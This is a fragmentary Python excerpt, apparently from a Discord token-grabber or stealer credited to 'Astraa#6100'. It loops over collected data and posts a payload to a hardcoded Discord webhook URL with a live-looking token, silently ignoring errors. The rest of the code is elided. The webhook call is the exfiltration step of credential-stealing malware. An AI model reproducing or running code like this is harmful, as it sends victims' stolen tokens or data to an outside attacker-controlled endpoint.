...
*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
                        ...
                        try:
                            ...
                            req = Request('https://discord.com/api/webhooks/1253530215552913468/J8k0yl0L1ZWjhaJDdodPLg1wtNGKQ3mNm82hpfX4EdGNI2hdRM9_HZ26xIUcySTv1yAw', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
